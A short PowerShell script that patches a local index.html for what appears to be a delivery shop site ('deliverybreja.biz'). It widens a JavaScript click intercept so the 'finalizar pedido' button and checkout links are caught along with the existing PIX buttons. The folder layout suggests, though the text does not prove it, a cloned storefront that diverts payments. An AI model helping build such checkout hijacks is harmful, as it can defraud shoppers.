$path = "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\9345488724234\index.html"
$text = [System.IO.File]::ReadAllText($path, [System.Text.Encoding]::UTF8)

# Add "finalizar pedido" to the check to intercept the checkout button
if ($text.Contains("if (text === 'pix' || text === 'pagar com pix') {")) {
    $text = $text.Replace("if (text === 'pix' || text === 'pagar com pix') {", "if (text === 'pix' || text === 'pagar com pix' || text === 'finalizar pedido' || el.closest('[href=`"/checkout`"]') || el.closest('[href=`"/9345488724234/checkout`"]')) {")
    [System.IO.File]::WriteAllText($path, $text, [System.Text.Encoding]::UTF8)
    Write-Output "Intercept updated in index.html"
} else {
    Write-Output "Could not find the intercept line in index.html!"
}
